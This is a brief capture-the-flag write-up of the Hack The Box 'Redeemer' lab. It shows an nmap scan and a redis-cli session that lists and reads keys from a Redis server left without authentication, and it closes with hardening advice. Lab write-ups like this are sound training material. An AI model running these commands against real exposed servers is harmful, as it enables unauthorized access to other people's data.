# Redeemer

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 0) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Unauthenticated Redis |

## Overview
A host running Redis with no authentication.

## Enumeration
```bash
nmap -sC -sV -p- -oN nmap.txt <TARGET_IP>
# 6379/tcp open  redis
```

## Exploitation
```bash
redis-cli -h <TARGET_IP>
> info
> keys *
> select 0        # the data lived in db0, not the db I first landed in
> get <key>
```

## Key Takeaway
Require authentication on Redis and bind it to localhost/internal interfaces only.

## My note
`get` returned nil at first because I was in the wrong logical database. `select 0`
put me back in db0 where the key lived. Small, but a good reminder to check context
before assuming a service is empty.
